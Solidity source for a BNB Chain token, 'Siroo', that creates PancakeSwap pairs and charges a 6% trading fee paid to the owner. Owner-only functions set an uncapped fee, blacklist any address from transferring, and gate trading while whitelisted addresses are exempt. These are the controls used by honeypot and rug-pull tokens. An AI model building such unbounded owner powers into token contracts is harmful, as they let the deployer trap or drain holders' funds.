// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract Siroo is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;

    string private _name = "Siroo";
    string private _symbol = "SIR";
    uint8 private _decimals = 9;
    uint256 private _total;

    uint256 public txFee = 6;

    address public swapPair;
    address public mainPair;

    bool public tradeEnable;
    mapping(address => bool) private _feeWhiteList;
    mapping(address => bool) private _blackList;

    constructor () {
        ISwapRouter _swapRouter = ISwapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address usdt = address(0x55d398326f99059fF775485246999027B3197955);
        mainPair = ISwapFactory(_swapRouter.factory()).createPair(address(this), _swapRouter.WETH());

        swapPair = ISwapFactory(_swapRouter.factory()).createPair(address(this), usdt);

        _total = 280 * 10000 * 10 ** _decimals;
        _balances[msg.sender] = _total;
        emit Transfer(address(0), msg.sender, _total);

        fundAddress = msg.sender;

        _feeWhiteList[msg.sender] = true;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _total;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "approve from the zero address");
        require(spender != address(0), "approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "Transfer from the zero address");
        require(to != address(0), "Transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        require(!_blackList[from], "Transfer from the blackList address");

        _balances[from] = _balances[from] - amount;

        if (from == swapPair || from == mainPair || to == swapPair || to == mainPair) {
            if (!tradeEnable) {
                require(_feeWhiteList[from] || _feeWhiteList[to], "Trade not start");
            }

            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                uint256 txFeeAmount = amount * txFee / 100;
                _balances[fundAddress] = _balances[fundAddress] + txFeeAmount;
                emit Transfer(from, fundAddress, txFeeAmount);

                amount = amount - txFeeAmount;
            }
        }

        _balances[to] = _balances[to] + amount;
        emit Transfer(from, to, amount);
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setTxFee(uint256 fee) external onlyOwner {
        txFee = fee;
    }

    function setTradeEnable(bool enable) external onlyOwner {
        tradeEnable = enable;
    }

    function setBlackList(address addr, bool enable) external onlyOwner {
        _blackList[addr] = enable;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }

    function isFeeWhiteList(address addr) external view returns (bool){
        return _feeWhiteList[addr];
    }

    function isBlackList(address addr) external view returns (bool){
        return _blackList[addr];
    }
}